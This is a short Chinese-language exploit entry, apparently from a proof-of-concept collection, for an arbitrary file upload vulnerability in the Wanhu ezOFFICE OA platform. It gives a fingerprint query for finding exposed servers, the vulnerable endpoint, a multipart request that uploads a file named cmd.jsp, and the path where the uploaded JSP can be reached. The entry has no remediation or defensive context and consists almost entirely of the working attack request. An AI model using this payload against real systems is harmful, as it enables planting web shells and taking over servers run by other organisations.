# 万户OA-fileUpload.controller任意文件上传漏洞

万户OA-fileUpload.controller ｜ 文件上传 ｜ —
- **指纹**：`app="万户ezOFFICE协同管理平台"`
- **请求**：`POST /defaultroot/upload/fileUpload.controller HTTP/1.1`

**Payload**
```
--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
Content-Disposition: form-data; name="file"; filename="cmd.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary
aaaaa
--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--
文件路径 /defaultroot/upload/html/xxxxxxxxxx.jsp
```
- **响应特征**：200